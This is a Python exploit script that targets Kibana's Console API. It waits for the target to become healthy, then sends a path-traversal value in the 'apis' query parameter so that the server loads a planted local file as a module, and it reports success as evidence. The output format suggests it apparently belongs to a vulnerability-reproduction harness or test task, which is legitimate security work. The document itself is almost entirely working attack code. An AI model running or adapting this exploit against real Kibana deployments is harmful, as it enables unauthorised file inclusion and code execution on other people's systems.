#!/usr/bin/env python3
"""Load a planted module through Kibana Console's traversal route."""

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request


MODULE_PATH = "../../../../seed/console_module"


def request_json(url: str) -> tuple[int, dict[str, object]]:
    request = urllib.request.Request(url)
    try:
        response = urllib.request.urlopen(request, timeout=15)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        content = response.read().decode("utf-8", errors="replace")
        try:
            document = json.loads(content)
        except json.JSONDecodeError:
            document = {}
        if not isinstance(document, dict):
            document = {}
        return response.status, document


def wait_for_ready(target_url: str) -> None:
    deadline = time.monotonic() + 90
    while time.monotonic() < deadline:
        try:
            status, document = request_json(f"{target_url}/api/status")
        except urllib.error.URLError:
            status, document = 0, {}
        state = document.get("status")
        if (status == 200 and isinstance(state, dict)
                and isinstance(state.get("overall"), dict)
                and state["overall"].get("state") == "green"):
            return
        time.sleep(2)
    raise RuntimeError("Kibana did not report green application status")


def trigger_module(target_url: str) -> None:
    query = urllib.parse.urlencode({
        "sense_version": "@@SENSE_VERSION",
        "apis": MODULE_PATH,
    })
    status, document = request_json(
        f"{target_url}/api/console/api_server?{query}",
    )
    if status != 200 or document.get(MODULE_PATH) != {"loaded": True}:
        raise RuntimeError(f"Console did not load the module: HTTP {status}")


def main() -> None:
    target_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    wait_for_ready(target_url)
    trigger_module(target_url)
    print(json.dumps({"evidence_payload": {"module": MODULE_PATH}}))


if __name__ == "__main__":
    main()
